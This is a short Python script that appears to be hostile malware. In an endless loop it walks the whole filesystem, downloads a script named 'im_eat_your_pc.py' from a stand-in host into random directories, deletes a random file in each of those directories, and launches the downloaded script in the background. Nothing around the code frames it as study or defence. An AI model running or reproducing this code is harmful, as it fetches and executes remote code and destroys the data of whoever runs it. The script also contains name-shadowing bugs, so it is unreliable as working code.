import os, random, time, requests, subprocess

def d(u, d):
    f = os.path.join(d, u.split("/")[-1])
    with open(f, 'wb') as r:
        for c in requests.get(u, stream=True).iter_content(1024):
            if c: r.write(c)
    os.remove(random.choice([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))]))
    return f

while 1:
    a = [os.path.join(r, d) for r, dirs, files in os.walk("/") for d in dirs]
    if a:
        r = random.choice(a)
        f = d("https://dkxkdjx/im_eat_your_pc.py", r)
        subprocess.Popen(['nohup', 'python', f, '&'])
    time.sleep(0.05)
